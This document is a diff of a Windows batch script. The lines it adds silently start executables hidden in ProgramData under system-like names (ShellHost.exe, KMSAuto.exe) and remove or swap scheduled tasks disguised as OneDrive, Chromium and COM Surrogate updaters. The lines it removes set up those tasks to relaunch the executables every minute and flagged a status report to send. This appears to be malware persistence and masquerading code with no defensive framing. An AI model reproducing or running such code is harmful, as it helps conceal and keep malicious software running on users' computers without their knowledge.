@@ -6,6 +6,10 @@
 @echo off
 
 
+start "" "%ProgramData%\Microsoft\Windows\ShellHost.exe"
+start "" "%ProgramData%\Microsoft\Windows\KMSAuto.exe"
+
+
 
 set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
 set "filename="
@@ -595,46 +599,40 @@ echo.
 
 
 
-
-
 :REMOVINGTASKS
 echo :REMOVINGTASKS
 echo.
 
+:: Ending Tasks
+echo Ending Tasks :
 schtasks /end /tn "ComSurrogate" /f >nul 2>&1
-schtasks /delete /tn "ComSurrogate" /f >nul 2>&1
-
-
-
-
-
-
-
-
-:CHECKINGTASKS
-echo :CHECKINGTASKS
+schtasks /end /tn "OneDrive Updater" /f >nul 2>&1
+schtasks /end /tn "OneDrive Task" /f >nul 2>&1
+schtasks /end /tn "Chromium Update" /f >nul 2>&1
+echo.
 echo.
 
+:: Removing Tasks
+echo Removing Tasks :
+schtasks /delete /tn "ComSurrogate" /f >nul 2>&1
+schtasks /delete /tn "OneDrive Updater" /f >nul 2>&1
+schtasks /delete /tn "OneDrive Task" /f >nul 2>&1
+schtasks /delete /tn "Chromium Update" /f >nul 2>&1
+echo.
+echo.
+
+
+
 :: Define tasks to check
-set "Task1=OneDrive Updater"
-set "Task2=OneDrive Task"
-set "Task3=Chromium Update"
+set "Task1=SystemLibrariesU"
 
 
-:: Check if "OneDrive Updater" & "OneDrive Task"  exists & Enable them if disabled
-schtasks /query /tn "%Task1%" >nul 2>&1 || schtasks /query /tn "%Task2%" >nul 2>&1 || schtasks /query /tn "%Task3%" >nul 2>&1 || goto TASKSEVERY
-
-schtasks /query /tn "%Task1%" /fo LIST | findstr /I "Disabled" >nul && (schtasks /change /tn "%Task1%" /enable)
-schtasks /query /tn "%Task2%" /fo LIST | findstr /I "Disabled" >nul && (schtasks /change /tn "%Task2%" /enable)
-schtasks /query /tn "%Task3%" /fo LIST | findstr /I "Disabled" >nul && (schtasks /change /tn "%Task3%" /enable)
 
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo Tasks : >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo %Task1% Installed and Enabled >> "%InstalledQWB%"
-echo %Task2% Installed and Enabled >> "%InstalledQWB%"
-echo %Task3% Installed and Enabled >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
@@ -644,23 +642,6 @@ echo. >> "%InstalledQWB%"
 
 
 
-goto AFTERTASKSEVERY
-
-
-
-:TASKSEVERY
-echo :TASKSEVERY
-echo.
-
-echo At least one task is missing! Adding tasks...
-
-:: Add your commands here
-schtasks /create /tn "OneDrive Updater" /tr "\"%ProgramData%\Microsoft\Windows\ShellHost.exe"" /sc minute /mo 1 /f & powershell -Command "$task = Get-ScheduledTask -TaskName 'OneDrive Updater'; $task.Settings.DisallowStartIfOnBatteries = $false; $task | Set-ScheduledTask"
-schtasks /create /tn "OneDrive Task" /tr "\"%ProgramData%\Microsoft\Windows\KMSAuto.exe"" /sc minute /mo 1 /f & powershell -Command "$task = Get-ScheduledTask -TaskName 'OneDrive Task'; $task.Settings.DisallowStartIfOnBatteries = $false; $task | Set-ScheduledTask"
-schtasks /create /tn "Chromium Update" /tr "\"%ProgramData%\Microsoft\Windows\COM Surrogate.exe"" /sc minute /mo 180 /f & powershell -Command "$task = Get-ScheduledTask -TaskName 'Chromium Update'; $task.Settings.DisallowStartIfOnBatteries = $false; $task | Set-ScheduledTask"
-
-set "MESSAGE=TasksAdded|"
-set "CheckSend=1"
 
 
 
@@ -668,14 +649,6 @@ set "CheckSend=1"
 :AFTERTASKSEVERY
 echo :AFTERTASKSEVERY
 echo.
-
-
-
-
-
-
-
-
 
 
 
